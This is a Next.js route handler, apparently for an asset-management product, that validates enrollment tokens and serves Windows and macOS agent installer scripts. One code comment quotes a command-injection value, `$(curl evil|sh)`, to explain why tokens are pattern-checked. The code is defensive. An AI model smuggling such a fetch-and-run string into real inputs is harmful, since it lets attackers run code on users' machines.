import { NextResponse } from "next/server"
import { connectDB } from "@/lib/db"
import { DeviceEnrollmentToken } from "@/models/DeviceEnrollmentToken"
import { hashToken, ENROLLMENT_TOKEN_PATTERN } from "@/lib/agent/tokens"
import {
  windowsInstallerScript,
  windowsLauncherBat,
  macInstallerScript,
} from "@/lib/agent/scripts"

export async function GET(
  _req: Request,
  { params }: { params: Promise<{ platform: string; token: string }> }
) {
  const { platform, token } = await params
  const apiBase = process.env.APP_BASE_URL ?? ""
  const noCache = { "Cache-Control": "no-store, no-cache, must-revalidate" }

  // The token is interpolated into PowerShell/bash/.bat source below, so it
  // must be exactly the hex format createEnrollmentToken() produces —
  // anything else (e.g. `$(curl evil|sh)`) would execute on the employee's
  // machine from our own domain. Also refuse dead tokens, so a link can't
  // be used to serve installers indefinitely.
  if (!ENROLLMENT_TOKEN_PATTERN.test(token)) {
    return NextResponse.json({ error: "This install link is invalid or has expired." }, { status: 404 })
  }
  await connectDB()
  const live = await DeviceEnrollmentToken.exists({
    tokenHash: hashToken(token),
    usedAt: null,
    expiresAt: { $gt: new Date() },
  }).setOptions({ skipTenantGuard: true })
  if (!live) {
    return NextResponse.json({ error: "This install link is invalid or has expired." }, { status: 404 })
  }

  // What employees actually download and double-click. A .bat runs
  // immediately on double-click (unlike .ps1, which Windows opens in a
  // text editor by default) — it just fetches and runs the real script.
  if (platform === "windows") {
    return new NextResponse(windowsLauncherBat({ apiBase, token }), {
      headers: {
        "Content-Type": "application/octet-stream",
        "Content-Disposition": 'attachment; filename="AssetFlowAgent-Install.bat"',
        ...noCache,
      },
    })
  }

  // The actual PowerShell logic — fetched programmatically by the .bat
  // above, not meant to be downloaded/run directly by a person.
  if (platform === "windows-script") {
    return new NextResponse(windowsInstallerScript({ apiBase, token }), {
      headers: { "Content-Type": "text/plain; charset=utf-8", ...noCache },
    })
  }

  if (platform === "mac") {
    return new NextResponse(macInstallerScript({ apiBase, token }), {
      headers: {
        "Content-Type": "application/octet-stream",
        "Content-Disposition": 'attachment; filename="AssetFlowAgent-Install.command"',
        ...noCache,
      },
    })
  }

  return NextResponse.json({ error: "Unknown platform" }, { status: 400 })
}
